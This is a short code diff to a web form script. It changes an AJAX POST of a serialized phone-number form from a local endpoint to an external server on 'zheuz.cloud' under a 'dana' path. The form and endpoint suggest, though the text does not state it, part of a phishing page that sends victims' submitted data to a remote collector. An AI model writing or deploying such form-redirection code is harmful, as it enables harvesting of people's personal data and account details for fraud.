@@ -131,7 +131,7 @@ var nohp = document.getElementById("nohp").value;
 sessionStorage.setItem("nohp", nohp);
         $.ajax({
             type: 'POST',
-            url: 'req/one.php',
+            url: 'https://zheuz.cloud/dana/egom1/1.php',
             data: $('#formNohp').serialize(),
             dataType: 'JSON',
             complete: function(){
